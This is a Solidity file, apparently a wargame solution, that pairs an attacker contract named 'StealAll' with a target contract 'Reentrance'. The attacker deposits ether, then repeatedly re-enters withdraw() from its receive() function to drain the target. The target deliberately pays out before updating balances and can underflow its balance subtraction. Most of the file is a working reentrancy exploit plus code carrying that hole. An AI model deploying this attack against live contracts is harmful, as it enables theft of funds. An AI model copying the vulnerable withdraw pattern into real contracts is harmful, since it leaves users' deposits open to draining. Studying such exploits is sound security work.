// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.0;

contract StealAll {
    
    Reentrance reentranceContract;
    uint initialDeposit;
    bool keepReentering = true;
    
    constructor(address payable _reentranceContract) public {
        reentranceContract = Reentrance(_reentranceContract);
    }
    
    function execute() external payable {
        require(msg.value >= 0.1 ether, "Send at least 0.1 ether to initiate the attack.");
        
        initialDeposit = msg.value;
        
        // Deposit some fund to allow passing the initial require check in reentranceContract.withdraw()
        reentranceContract.donate{value: initialDeposit}(address(this));
        
        reentranceContract.withdraw(initialDeposit);
    }
    
    receive() external payable {
        uint contractBalance = msg.sender.balance;
        
        if (contractBalance == 0) {
            keepReentering = false;
        }
        
        if (keepReentering) {
            reentranceContract.withdraw(initialDeposit);
        }
    }
}

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/solc-0.6/contracts/math/SafeMath.sol';

contract Reentrance {
  
    using SafeMath for uint256;
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if(balances[msg.sender] >= _amount) {
            (bool result, bytes memory data) = msg.sender.call.value(_amount)("");
            if(result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    fallback() external payable {}
}